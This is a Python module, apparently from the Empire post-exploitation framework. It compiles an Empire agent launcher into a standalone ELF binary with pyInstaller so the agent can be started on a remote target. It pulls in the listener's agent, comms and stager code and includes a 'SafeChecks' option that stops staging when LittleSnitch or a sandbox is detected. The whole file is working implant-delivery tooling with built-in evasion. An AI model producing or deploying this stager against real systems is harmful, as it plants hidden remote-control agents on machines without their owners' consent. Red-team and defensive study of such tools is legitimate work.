import logging
import os
import time

"""

Install steps...

- install pyInstaller
-- try:


- copy into stagers directory
-- ./Empire/lib/stagers/

- kick off the empire agent on a remote target
-- /tmp/empire &

@TweekFawkes

"""

log = logging.getLogger(__name__)


class Stager:
    def __init__(self, mainMenu):
        self.info = {
            "Name": "pyInstaller Launcher",
            "Authors": [
                {
                    "Name": "Bryce Kunz",
                    "Handle": "@TweekFawkes",
                    "Link": "https://twitter.com/TweekFawkes",
                }
            ],
            "Description": "Generates an ELF binary payload launcher for Empire using pyInstaller.",
            "Comments": [
                "Needs to have pyInstaller setup on the system you are creating the stager on. For debian based operatins systems try the following command: apt-get -y install python-pip && pip install pyinstaller"
            ],
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            "Listener": {
                "Description": "Listener to generate stager for.",
                "Required": True,
                "Value": "",
            },
            "Language": {
                "Description": "Language of the stager to generate.",
                "Required": True,
                "Value": "python",
                "SuggestedValues": ["python"],
                "Strict": True,
            },
            "BinaryFile": {
                "Description": "File to output launcher to.",
                "Required": True,
                "Value": "/tmp/empire",
            },
            "SafeChecks": {
                "Description": "Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.",
                "Required": True,
                "Value": "True",
                "SuggestedValues": ["True", "False"],
                "Strict": True,
            },
            "UserAgent": {
                "Description": "User-agent string to use for the staging request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "OutFile": {
                "Description": "Filename that should be used for the generated output.",
                "Required": True,
                "Value": "Empire",
            },
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

    def generate(self):
        # extract all of our options
        language = self.options["Language"]["Value"]
        listener_name = self.options["Listener"]["Value"]
        user_agent = self.options["UserAgent"]["Value"]
        safe_checks = self.options["SafeChecks"]["Value"]
        binary_file_str = self.options["BinaryFile"]["Value"]
        encode = False

        import subprocess

        output_str = subprocess.check_output(["which", "pyinstaller"])
        if output_str == "":
            log.error("pyInstaller is not installed")
            log.error("Try: apt-get -y install python-pip && pip install pyinstaller")
            return ""

        # generate the launcher code
        launcher = self.mainMenu.stagers.generate_launcher(
            listenerName=listener_name,
            language=language,
            encode=encode,
            userAgent=user_agent,
            safeChecks=safe_checks,
        )
        if launcher == "":
            log.error("Error in launcher command generation.")
            return ""

        active_listener = self.mainMenu.listenersv2.get_active_listener_by_name(
            listener_name
        )

        agent_code = active_listener.generate_agent(
            active_listener.options, language=language
        )
        comms_code = active_listener.generate_comms(
            active_listener.options, language=language
        )

        stager_code = active_listener.generate_stager(
            active_listener.options,
            language=language,
            encrypt=False,
            encode=False,
        )

        imports_list = []
        for code in [agent_code, comms_code, stager_code]:
            for line in code.splitlines():
                _line = line.strip()
                if _line.startswith("from System"):
                    # Skip Ironpython imports
                    pass
                elif _line.startswith("import sslzliboff"):
                    # Sockschain checks to import this, so we will just skip it
                    pass
                elif _line.startswith("import ") or _line.startswith("from "):
                    imports_list.append(_line)

        imports_list.append("import trace")
        imports_list.append("import json")
        imports_list = list(set(imports_list))  # removing duplicate strings
        imports_str = "\n".join(imports_list)
        launcher = imports_str + "\n" + launcher

        with open(binary_file_str + ".py", "w") as text_file:
            text_file.write(f"{launcher}")

        output_str = subprocess.run(
            [
                "pyinstaller",
                "-y",
                "--clean",
                "--specpath",
                os.path.dirname(binary_file_str),
                "--distpath",
                os.path.dirname(binary_file_str),
                "--workpath",
                "/tmp/" + str(time.time()) + "-build/",
                "--onefile",
                binary_file_str + ".py",
            ],
            check=False,
        )

        with open(binary_file_str, "rb") as f:
            return f.read()
